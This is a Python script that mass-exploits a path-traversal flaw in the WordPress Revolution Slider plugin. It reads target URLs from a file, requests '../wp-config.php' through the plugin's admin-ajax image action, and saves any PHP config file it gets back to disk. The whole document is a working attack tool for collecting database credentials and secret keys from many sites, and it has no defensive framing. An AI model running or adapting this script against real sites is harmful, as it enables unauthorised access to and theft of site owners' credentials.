import requests,os,urllib.request,time
from urllib.parse import urlparse
f = open("list.txt", "r")
fc = f.readlines()
x=0
for line in fc:
	o = urlparse(line)
	if o.scheme == "http" or "www" or "https":
		line = o.scheme+ "://"+ o.netloc
		line = line.strip()
		thing = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
		line+=thing
		try:
			up = urllib.request.urlopen(line).getcode()
			if up == 200:
				url = line
				r = requests.get(url, allow_redirects=True)
				if r.content == b'0':
					print ("No data found from " + line)
					continue
				else:
					x=x+1
					name = str(x)+'_admin-ajax.php'
					if r.content.startswith(b'<?php'):
						open(name, 'wb').write(r.content)
						empty = open(name, 'r')
						rd = empty.readlines()
						print (line)
						continue
					else:
						print (line + " Is not a valid php file")
						continue
		except:
			print ("error")
			pass